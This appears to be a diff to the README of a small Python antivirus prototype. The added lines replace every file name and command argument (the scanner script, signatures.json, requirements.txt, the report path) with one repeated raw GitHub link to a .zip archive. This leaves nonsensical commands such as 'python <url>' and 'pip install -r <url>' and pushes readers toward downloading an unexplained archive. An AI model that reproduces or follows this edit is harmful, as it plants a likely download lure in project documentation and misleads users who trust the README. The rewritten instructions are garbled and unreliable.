@@ -14,9 +14,9 @@ This repository contains a simple antivirus prototype implementing recursive sca
   - SHA-256 hash matching.
 - **Heuristic Detection**:
   - Suspicious file extensions: `.exe .bat .vbs .js .jar .ps1 .cmd .scr .msi`
-  - Double extensions: `file.txt.exe`
+  - Double extensions: `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip`
   - Large executables over **50 MB**
-  - Suspicious keywords inside scripts (configurable via `signatures.json`)
+  - Suspicious keywords inside scripts (configurable via `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip`)
 - **Quarantine/Removal**: Move to a quarantine folder (preserving structure) or delete.
 - **Report Generation**: JSON report with totals and per-file actions.
 - **Real-time Scanner** (Bonus): Uses `watchdog` to monitor a folder for new files.
@@ -24,26 +24,26 @@ This repository contains a simple antivirus prototype implementing recursive sca
 ## Quick Start/ Usage
 
 Quarantine on detection:
-python antivirus.py --path /path/to/scan --action quarantine --quarantine-dir ./quarantine --signatures ./signatures.json --report ./report.json
+python https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip --path /path/to/scan --action quarantine --quarantine-dir ./quarantine --signatures https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip --report https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip
 
 Delete on detection:
-python antivirus.py --path /path/to/scan --action delete --signatures ./signatures.json
+python https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip --path /path/to/scan --action delete --signatures https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip
 
 Monitor in real time (Ctrl+C to stop):
-python antivirus.py --path /path/to/scan --monitor --action quarantine --quarantine-dir ./quarantine
+python https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip --path /path/to/scan --monitor --action quarantine --quarantine-dir ./quarantine
 
 
 ## File Overview
-- `antivirus.py` — main scanner script.
-- `antivirus_gui.py` — main scanner script with GUI access.
-- `antivirus.py` — Executable GUI. ('used pyinstaller --onefile antivirus_gui.py to convert to exe')
-- `signatures.json` — sample signatures database (edit to add your IoCs).
-- `requirements.txt` — optional dependency for real-time monitoring (`watchdog`).
-- `report.json` — generated after a scan (path configurable).
+- `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` — main scanner script.
+- `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` — main scanner script with GUI access.
+- `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` — Executable GUI. ('used pyinstaller --onefile https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip to convert to exe')
+- `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` — sample signatures database (edit to add your IoCs).
+- `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` — optional dependency for real-time monitoring (`watchdog`).
+- `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` — generated after a scan (path configurable).
 - `test` — contains test virus files.
 
 ## Signatures Format
-`signatures.json` expects:
+`https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` expects:
 json
 {
   "patterns": ["regex-or-literal", "another-pattern"],
@@ -58,17 +58,17 @@ json
 - Content scanning only inspects the first ~2MB of files to limit memory and time usage.
 - "Large executable" is determined purely by extension + size.
 - Some files may not be readable due to permissions; these are skipped gracefully.
-- False positives/negatives are possible; tune `signatures.json` to your environment.
+- False positives/negatives are possible; tune `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` to your environment.
 - For real-time monitoring, install `watchdog` and ensure the process has access to the target path.
 
 ## Install
 Python 3.8+ recommended.
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip
 
 
 ## Generate a Sample Report
 
-python antivirus.py --path . --action none --signatures ./signatures.json --report ./report.json
+python https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip --path . --action none --signatures https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip --report https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip
 
 
 ## Security Tips
